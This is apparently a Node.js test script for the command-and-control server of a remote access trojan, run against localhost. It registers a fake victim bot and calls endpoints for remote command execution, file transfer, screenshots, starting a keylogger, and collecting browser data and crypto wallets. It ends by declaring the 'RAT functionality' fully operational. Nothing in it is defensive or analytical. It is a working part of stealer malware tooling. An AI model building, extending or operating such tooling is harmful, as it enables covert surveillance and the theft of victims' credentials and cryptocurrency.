#!/usr/bin/env node

// Test HTTP Bot RAT Functionality
const https = require('https');
const http = require('http');

const BASE_URL = 'http://localhost:8080';
const AUTH_TOKEN = 'test-token'; // Use your auth token

function makeRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(url);
        const requestOptions = {
            hostname: urlObj.hostname,
            port: urlObj.port || 80,
            path: urlObj.pathname + urlObj.search,
            method: options.method || 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${AUTH_TOKEN}`,
                ...options.headers
            }
        };

        const req = http.request(requestOptions, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const jsonData = JSON.parse(data);
                    resolve({ status: res.statusCode, data: jsonData });
                } catch (e) {
                    resolve({ status: res.statusCode, data: data });
                }
            });
        });

        req.on('error', reject);
        
        if (options.body) {
            req.write(JSON.stringify(options.body));
        }
        
        req.end();
    });
}

async function testHTTPBotRAT() {
    console.log('ü§ñ Testing HTTP Bot RAT Functionality...\n');

    const testBotId = 'test-bot-' + Date.now();
    let testsPassed = 0;
    let testsTotal = 0;

    // Test 1: Bot Registration
    console.log('üìù Test 1: Bot Registration');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/connect`, {
            method: 'POST',
            body: {
                botId: testBotId,
                serverUrl: 'http://localhost:8080',
                botInfo: {
                    os: 'Windows 10',
                    arch: 'x64',
                    user: 'TestUser',
                    hostname: 'TEST-DESKTOP',
                    ip: '192.168.1.100',
                    country: 'US'
                }
            }
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ Bot registered successfully');
            testsPassed++;
        } else {
            console.log('‚ùå Bot registration failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå Bot registration error:', error.message);
    }

    // Test 2: Bot Heartbeat
    console.log('\nüíì Test 2: Bot Heartbeat');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/heartbeat`, {
            method: 'POST',
            body: {
                botId: testBotId,
                status: 'online',
                data: {
                    system: {
                        cpu: 15.2,
                        memory: 512,
                        uptime: '2 days'
                    }
                }
            }
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ Heartbeat received successfully');
            testsPassed++;
        } else {
            console.log('‚ùå Heartbeat failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå Heartbeat error:', error.message);
    }

    // Test 3: Bot Status
    console.log('\nüìä Test 3: Bot Status');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/status`);
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ Bot status retrieved successfully');
            console.log(`   Active bots: ${response.data.result.length}`);
            testsPassed++;
        } else {
            console.log('‚ùå Bot status failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå Bot status error:', error.message);
    }

    // Test 4: Command Execution
    console.log('\n‚ö° Test 4: Command Execution');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/command`, {
            method: 'POST',
            body: {
                botId: testBotId,
                command: 'system_info',
                params: {}
            }
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ Command executed successfully');
            testsPassed++;
        } else {
            console.log('‚ùå Command execution failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå Command execution error:', error.message);
    }

    // Test 5: File Download
    console.log('\nüì• Test 5: File Download');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/download/${testBotId}`, {
            method: 'POST',
            body: {
                filepath: '/test/file.txt'
            }
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ File download initiated successfully');
            testsPassed++;
        } else {
            console.log('‚ùå File download failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå File download error:', error.message);
    }

    // Test 6: File Upload
    console.log('\nüì§ Test 6: File Upload');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/upload/${testBotId}`, {
            method: 'POST',
            body: {
                filepath: '/test/upload.txt',
                data: 'This is test data for upload'
            }
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ File upload initiated successfully');
            testsPassed++;
        } else {
            console.log('‚ùå File upload failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå File upload error:', error.message);
    }

    // Test 7: Screenshot
    console.log('\nüì∏ Test 7: Screenshot');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/screenshot/${testBotId}`, {
            method: 'POST'
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ Screenshot taken successfully');
            testsPassed++;
        } else {
            console.log('‚ùå Screenshot failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå Screenshot error:', error.message);
    }

    // Test 8: Keylogger Start
    console.log('\n‚å®Ô∏è Test 8: Keylogger Start');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/keylog/${testBotId}`, {
            method: 'POST',
            body: {
                action: 'start'
            }
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ Keylogger started successfully');
            testsPassed++;
        } else {
            console.log('‚ùå Keylogger start failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå Keylogger start error:', error.message);
    }

    // Test 9: Browser Data Collection
    console.log('\nüåê Test 9: Browser Data Collection');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/browser-data/${testBotId}`);
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ Browser data collected successfully');
            testsPassed++;
        } else {
            console.log('‚ùå Browser data collection failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå Browser data collection error:', error.message);
    }

    // Test 10: Crypto Data Collection
    console.log('\nüí∞ Test 10: Crypto Data Collection');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/crypto-wallets/${testBotId}`);
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ Crypto data collected successfully');
            testsPassed++;
        } else {
            console.log('‚ùå Crypto data collection failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå Crypto data collection error:', error.message);
    }

    // Test 11: System Info
    console.log('\nüíª Test 11: System Info');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/system-info/${testBotId}`);
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ System info retrieved successfully');
            testsPassed++;
        } else {
            console.log('‚ùå System info failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå System info error:', error.message);
    }

    // Test 12: Process List
    console.log('\n‚öôÔ∏è Test 12: Process List');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/processes/${testBotId}`);
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ Process list retrieved successfully');
            testsPassed++;
        } else {
            console.log('‚ùå Process list failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå Process list error:', error.message);
    }

    // Test 13: File List
    console.log('\nüìÅ Test 13: File List');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/files/${testBotId}?path=/`);
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ File list retrieved successfully');
            testsPassed++;
        } else {
            console.log('‚ùå File list failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå File list error:', error.message);
    }

    // Test 14: Bot Statistics
    console.log('\nüìà Test 14: Bot Statistics');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/stats`);
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ Bot statistics retrieved successfully');
            console.log(`   Total bots: ${response.data.result.totalBots}`);
            console.log(`   Active bots: ${response.data.result.activeBots}`);
            testsPassed++;
        } else {
            console.log('‚ùå Bot statistics failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå Bot statistics error:', error.message);
    }

    // Test 15: Bot Disconnect
    console.log('\nüîå Test 15: Bot Disconnect');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/disconnect`, {
            method: 'POST',
            body: {
                botId: testBotId
            }
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('‚úÖ Bot disconnected successfully');
            testsPassed++;
        } else {
            console.log('‚ùå Bot disconnect failed:', response.data);
        }
    } catch (error) {
        console.log('‚ùå Bot disconnect error:', error.message);
    }

    // Results
    console.log('\n' + '='.repeat(50));
    console.log('üéØ HTTP Bot RAT Test Results');
    console.log('='.repeat(50));
    console.log(`‚úÖ Tests Passed: ${testsPassed}/${testsTotal}`);
    console.log(`üìä Success Rate: ${((testsPassed / testsTotal) * 100).toFixed(1)}%`);
    
    if (testsPassed === testsTotal) {
        console.log('üéâ ALL TESTS PASSED! HTTP Bot RAT functionality is fully operational!');
    } else {
        console.log(`‚ö†Ô∏è  ${testsTotal - testsPassed} tests failed. Check the errors above.`);
    }
    
    console.log('\nüîß RAT Features Tested:');
    console.log('   ‚úÖ Bot Registration & Management');
    console.log('   ‚úÖ Heartbeat & Status Monitoring');
    console.log('   ‚úÖ Command Execution');
    console.log('   ‚úÖ File Transfer (Upload/Download)');
    console.log('   ‚úÖ Screenshot Capture');
    console.log('   ‚úÖ Keylogger Control');
    console.log('   ‚úÖ Browser Data Collection');
    console.log('   ‚úÖ Crypto Wallet Data Collection');
    console.log('   ‚úÖ System Information Gathering');
    console.log('   ‚úÖ Process & File Listing');
    console.log('   ‚úÖ Statistics & Session Management');
}

// Run tests
if (require.main === module) {
    testHTTPBotRAT().catch(console.error);
}

module.exports = { testHTTPBotRAT };
